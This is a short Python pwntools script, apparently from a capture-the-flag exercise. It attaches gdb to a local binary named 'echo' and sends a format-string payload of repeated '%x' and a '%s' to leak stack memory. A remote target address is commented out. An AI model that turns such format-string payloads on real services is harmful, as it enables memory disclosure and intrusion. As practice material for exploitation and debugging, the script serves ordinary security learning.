#!/usr/bin/python3

from pwn import *

context.log_level = "debug"
context.arch = "i386"

r = process("./echo")

# r = remote("124.16.75.117", 51004)

# payload = b"%08x|" * 10
payload = b"%x " * 8 + b"%s "

gdb.attach(r, "b*0x804871e")

r.sendlineafter(b"> ", payload)


r.interactive()
